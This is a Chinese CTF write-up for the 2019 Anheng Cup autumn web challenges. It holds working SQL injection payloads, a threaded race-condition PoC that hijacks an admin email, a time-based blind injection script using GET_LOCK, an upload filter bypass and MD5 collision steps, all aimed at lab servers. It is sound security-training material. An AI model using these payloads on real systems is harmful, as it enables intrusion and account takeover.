+<h1 id="新闻搜索"><a href="#新闻搜索" class="headerlink" title="新闻搜索"></a>新闻搜索</h1><p>尝试注入</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130487146.png" alt="1571130487146"></p>
+<p>一步步注入得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">word=test&apos; union select 1,2,3 %23&amp;number=5</span><br></pre></td></tr></table></figure>
+<h1 id="一个hackerone的有趣的漏洞的复现的题目"><a href="#一个hackerone的有趣的漏洞的复现的题目" class="headerlink" title="一个hackerone的有趣的漏洞的复现的题目"></a>一个hackerone的有趣的漏洞的复现的题目</h1><h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><p>扫描发现源代码泄露：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130863836.png" alt="1571130863836"></p>
+<p>还原源代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./Dumper/gitdumper.sh http://114.55.36.69:8023/.git/ /temp/hackerone</span><br><span class="line">./Extractor/extractor.sh /temp/hackerone /temp/hackerone</span><br></pre></td></tr></table></figure>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>从index.php:11-14看到，如果是管理员，则可以拿到flag：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571212369176.png" alt="1571212369176"></p>
+<p>跟is_admin(class.user.php):</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">       <span class="comment">// 检查用户名是否合法</span></span><br><span class="line">	<span class="keyword">if</span>(!zUserFile::validate_username($username))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">       <span class="comment">//获取userfile，其中有一属性为is_admin</span></span><br><span class="line">	$user = zUserFile::get_attrs($username);</span><br><span class="line">	<span class="keyword">if</span>($user[<span class="string">'is_admin'</span>] === <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validate_username</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(strlen($username) &gt; <span class="number">100</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	<span class="keyword">if</span> (preg_match(<span class="string">'/^[_\.\-0-9a-zA-Z]+$/i'</span>, $username)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_attrs</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">	$users = zUserFile::get_all_users();</span><br><span class="line">	<span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $users[<span class="string">'attrs'</span>][$username];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>is_admin没有突破口，但是跟流程的时候，发现注册用户有切换用户功能，看一下切换用户逻辑怎么做的：</p>
+<p>switch.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$userObj = <span class="keyword">new</span> zUser();</span><br><span class="line">$user = zUserFile::get_attrs($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$users = zUserFile::get_relate_users($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?trim($_GET[<span class="string">'username'</span>]):<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($username != <span class="keyword">false</span> &amp;&amp; zUserFile::is_exists($username))&#123;</span><br><span class="line">	$to_user = zUserFile::get_attrs($username);</span><br><span class="line">    <span class="comment">// 当前用户和目标用户以通过邮箱验证，并且当前用户邮箱与目标用户邮箱一致</span></span><br><span class="line">	<span class="keyword">if</span>($user[<span class="string">'email_verify'</span>] === <span class="number">1</span> &amp;&amp; $to_user[<span class="string">'email_verify'</span>] === <span class="number">1</span> &amp;&amp; $user[<span class="string">'email'</span>] === $to_user[<span class="string">'email'</span>])&#123;</span><br><span class="line">		$userObj-&gt;login2($username);</span><br><span class="line">		header(<span class="string">'Location: ./'</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login2</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">		$username = trim($username);</span><br><span class="line">		<span class="keyword">if</span>(!zUserFile::validate_username($username))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>问题转化为把自己邮箱弄成admin邮箱，继续审计绑定邮箱过程（chgemail.php、class.user.php）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(!chktoken())&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'INVALID REQUEST'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$email = <span class="keyword">isset</span>($_POST[<span class="string">'email'</span>])?trim($_POST[<span class="string">'email'</span>]):<span class="string">''</span>;</span><br><span class="line">	<span class="keyword">if</span>($userObj-&gt;chg_email($_SESSION[<span class="string">'username'</span>], $email))<span class="comment">//修改绑定邮箱</span></span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'SUCCESS'</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'FAILED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class.user.php</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg_email</span><span class="params">($username, $email)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>($email == <span class="keyword">false</span> || !zUserFile::validate_email($email))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$user = zUserFile::get_attrs($username);</span><br><span class="line">		$old_email = $user[<span class="string">'email'</span>];</span><br><span class="line">		$emails = zUserFile::get_emails();</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($emails[$old_email]))&#123;</span><br><span class="line">			$emails[$old_email] = array_diff($emails[$old_email], <span class="keyword">array</span>($username));</span><br><span class="line">			<span class="keyword">if</span>($emails[$old_email] == <span class="keyword">false</span>)&#123;</span><br><span class="line">				<span class="keyword">unset</span>($emails[$old_email]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">// 重绑定邮箱后，email_verify被重置, token被重置</span></span><br><span class="line">		zUserFile::update_attr($username, <span class="string">'email_verify'</span>, <span class="number">0</span>);</span><br><span class="line">		zUserFile::update_attr($username, <span class="string">'email'</span>, $email);</span><br><span class="line">		zUserFile::update_attr($username, <span class="string">'token'</span>, <span class="string">''</span>);</span><br><span class="line">		$us = @is_array($emails[$email])?$emails[$email]:<span class="keyword">array</span>();</span><br><span class="line">		$emails[$email] = array_merge($us, <span class="keyword">array</span>($username));</span><br><span class="line">		<span class="keyword">return</span> zUserFile::update_emails($emails);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validate_email</span><span class="params">($email)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(strlen($email) &gt; <span class="number">100</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">return</span> filter_var($email, FILTER_VALIDATE_EMAIL);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>也就是说重新绑定邮箱时，需要重新发邮件，然后验证，再看下验证部分代码（verify.php）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'token'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line">	$token = <span class="keyword">isset</span>($_GET[<span class="string">'token'</span>])?trim($_GET[<span class="string">'token'</span>]):<span class="string">''</span>;</span><br><span class="line">	$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?trim($_GET[<span class="string">'username'</span>]):<span class="string">''</span>;\</span><br><span class="line">    <span class="comment">// token和username不为空</span></span><br><span class="line">	<span class="keyword">if</span>($token == <span class="keyword">false</span> || $username == <span class="keyword">false</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'INVALID INPUT'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($userObj-&gt;verify_email($username, $token))&#123;</span><br><span class="line">		$userObj-&gt;login($username);</span><br><span class="line">		header(<span class="string">'location: ./'</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'INVALID TOKEN OR USERNAME'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class.user.php::zUser::verify_email</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_email</span><span class="params">($username, $token)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$token = trim($token);</span><br><span class="line">		<span class="keyword">if</span>($token == <span class="keyword">false</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$user = zUserFile::get_attrs($username);</span><br><span class="line">		$real_token = $user[<span class="string">"token"</span>];</span><br><span class="line">        <span class="comment">// 验证提交的token是否和数据库里的用户对应的token一致</span></span><br><span class="line">		<span class="keyword">if</span>(md5($real_token) !== md5($token))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">// token被重置</span></span><br><span class="line">		zUserFile::update_attr($username, <span class="string">'token'</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// Condition Race</span></span><br><span class="line">        <span class="comment">// verify设为1</span></span><br><span class="line">		zUserFile::update_attr($username, <span class="string">'email_verify'</span>, <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>审到这里想到条件竞争，如果走正常重置邮箱的流程，程序执行到<code>zUserFile::update_attr($username, &#39;token&#39;, &#39;&#39;);</code>时，再次请求重置邮箱，由于class.user.php::validate_email()没有检查valid状态，导致新的email被写入，程序再回到<code>zUserFile::update_attr($username, &#39;email_verify&#39;, 1);</code>，那么攻击这就可以重置任意邮箱了。</p>
+<p>梳理一下思路，也就是：</p>
+<ol>
+<li>注册用户验证邮箱</li>
+<li>重置邮箱（这里邮箱还写自己的）</li>
+<li>收到校验链接</li>
+<li>在请求校验链接同时，再次重置邮箱为管理员邮箱（ambulong@vulnspy.com，注册界面出现过），若该步骤在比较token一致—-&gt;set(email_verify=1)中间执行，则条件竞争成功。</li>
+</ol>
+<p>因此有以下PoC：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">HOST = <span class="string">"http://114.55.36.69:8023"</span></span><br><span class="line">VERIFY_URL = <span class="string">"/verify.php?token=7lGBgYOtvxoW7mRHdsGEFJqr6YMDIJjD&amp;username=admin1"</span></span><br><span class="line">SESSION=<span class="string">"h5evpbu7eclfe0kpfe3fad01q1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_verify</span><span class="params">()</span>:</span></span><br><span class="line">    res = requests.get(HOST + VERIFY_URL)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_email</span><span class="params">()</span>:</span></span><br><span class="line">    burp0_url = HOST + <span class="string">"/chgemail.php?token=JaX1dpl3"</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">"PHPSESSID"</span>: SESSION&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">"email"</span>: <span class="string">"ambulong@vulnspy.com"</span>, <span class="string">"submit"</span>: <span class="string">"Submit"</span>&#125;</span><br><span class="line">    res=requests.post(</span><br><span class="line">        burp0_url,</span><br><span class="line">        cookies=burp0_cookies,</span><br><span class="line">        data=burp0_data)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></span><br><span class="line">    t1 = threading.Thread(target=send_verify, args=())</span><br><span class="line">    t2 = threading.Thread(target=reset_email, args=())</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    poc()</span><br></pre></td></tr></table></figure>
+<p>运行后看到邮箱被修改，切换用户就能拿到flag了</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571219028911.png" alt="1571219028911"></p>
+<h1 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h1><p>PHP特性，</p>
+<ol>
+<li><p>参数名为A.A会转变为A_A，</p>
+</li>
+<li><p>数组&gt;inf</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571196679531.png" alt="1571196679531"></p>
+</li>
+<li><p>数组转换成字符串时会出错，因此结果==0</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571196848622.png" alt="1571196848622"></p>
+</li>
+</ol>
+<p>因此有payload：<code>/?A.A[]=1</code></p>
+<h1 id="新瓶装旧酒"><a href="#新瓶装旧酒" class="headerlink" title="新瓶装旧酒"></a>新瓶装旧酒</h1><p>73-81行需要传一个合法zip文件，无法绕过：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211251759.png" alt="1571211251759"></p>
+<p>接着，92-105行解压zip，并且移动到upload目录下：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211484309.png" alt="1571211484309"></p>
+<p>要求zip中存在图片后缀的文件，并且不包含”.ph”字符，可以通过”x.pHp.jpg”绕过，上传成功：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211770075.png" alt="1571211770075"></p>
+<h1 id="sleepcms"><a href="#sleepcms" class="headerlink" title="sleepcms"></a>sleepcms</h1><p>敏感路径扫描，发现<code>/robots.txt</code>泄露，打开发现提示</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571199573631.png" alt="1571199573631"></p>
+<p>以及注入点 <code>/article.php?id=2</code></p>
+<p>跑黑名单，发现select、sleep和benchmark都banned，解法是通过GET_LOCK</p>
+<blockquote>
+<p>GET_LOCK(str,timeout)<br>Tries to obtain a lock with a name given by the string str, using a timeout of timeout seconds. A negative timeout value means infinite timeout. The lock is exclusive. While held by one session, other sessions cannot obtain a lock of the same name.</p>
+</blockquote>
+<p>因此尝试<code>/article.php?id=2&#39; and (get_lock(&#39;vvvv&#39;,10)) #</code>可以成功延时，注意到同表做列查询时不需要用select，因此有如下脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleepcms</span><span class="params">()</span>:</span></span><br><span class="line">    base_url = <span class="string">"http://114.55.36.69:8007/article.php?id="</span></span><br><span class="line">    dic = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    cur = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">"1'/**/and/**/(if(substr(content,&#123;pos&#125;,1)='&#123;char&#125;',get_lock('nonce',3),0))/**/#"</span></span><br><span class="line">            url = base_url+urllib.parse.quote(payload.format(pos=cur,char=i))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                res = requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                flag += str(i)</span><br><span class="line">                cur += <span class="number">1</span></span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    sleepcms()</span><br></pre></td></tr></table></figure>
+<p>运行得到flag：<code>flagis{Flag{C221e22A28b933f103f0f88caB68b79b}}</code>，改成小写提交最里面括号的内容</p>
+<h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>要求<code>$_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;] &amp;&amp; md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])</code>，强网杯原题，参考<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">如何用不同的数值构建一样的MD5</a>。</p>
+<p>指定param1和param2相同的开头，这里以”1”为例:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1&gt;init.txt</span><br></pre></td></tr></table></figure>
+<p>接着使用fastcoll生成具有相同md5的文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">λ fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</span><br><span class="line">MD5 collision generator v1.5</span><br><span class="line">by Marc Stevens (http://www.win.tue.nl/hashclash/)</span><br><span class="line"></span><br><span class="line">Using output filenames: <span class="string">'1.txt'</span> and <span class="string">'2.txt'</span></span><br><span class="line">Using prefixfile: <span class="string">'init.txt'</span></span><br><span class="line">Using initial value: b012cf77f9677e37eea923017fc5e83e</span><br><span class="line"></span><br><span class="line">Generating first block: ..</span><br><span class="line">Generating second block: S00....</span><br><span class="line">Running time: 0.641 s</span><br></pre></td></tr></table></figure>
+<p>将1.txt和2.txt内容进行编码后发送即可的得到flag。</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571140925389.png" alt="1571140925389"></p>
+<p>提供代码方便复现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $text1=$_POST["data1"];</span></span><br><span class="line"><span class="comment">// $text2=$_POST["data2"];</span></span><br><span class="line"></span><br><span class="line">$text1=readmyfile(<span class="string">"1.txt"</span>);</span><br><span class="line">$text2=readmyfile(<span class="string">"2.txt"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'MD51: '</span>. md5($text1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>. urlencode($text1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode ($text1));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'MD52: '</span>.md5($text2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.  urlencode($text2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5( urlencode($text2));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h1><p>访问网站源代码，看到提示：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131147272.png" alt="1571131147272"></p>
+<p>实际上是说，<code>md5($_POST[&#39;data1&#39;])!=md5($_POST[&#39;data2&#39;])</code>，由于没用全等，用<code>0e</code>绕过即可：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131226817.png" alt="1571131226817"></p>
+<h1 id="秘密的系统"><a href="#秘密的系统" class="headerlink" title="秘密的系统"></a>秘密的系统</h1><h2 id="0x01-信息泄露"><a href="#0x01-信息泄露" class="headerlink" title="0x01 信息泄露"></a>0x01 信息泄露</h2><p>首先，dirsearch发现泄露.idea/workspace.xml文件：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571192815365.png" alt="1571192815365"></p>
+<p>workspace发现更多的文件：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571192935874.png" alt="1571192935874"></p>
+<p>php文件未必能访问，看<code>/web/robots.txt</code>:</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193047923.png" alt="1571193047923"></p>
+<p>访问<code>/web/index.php?r=site/loginuser_1</code>发现有一段注释：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193204265.png" alt="1571193204265"></p>
+<p>到Github搜索关键词，能看到更多的提示：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193458794.png" alt="1571193458794"></p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193530702.png" alt="1571193530702"></p>
+<h2 id="0x02-反序列化垂直越权"><a href="#0x02-反序列化垂直越权" class="headerlink" title="0x02 反序列化垂直越权"></a>0x02 反序列化垂直越权</h2><p>看提示大概是要用反序列化做垂直越权了：</p>
+<p>先抓包登录，然后cookie字段被塞了一个cib字段</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193790173.png" alt="1571193790173"></p>
+<p>考虑到注释里面，sign需要的id，name都是可控的，伪造一个admin的cookie</p>
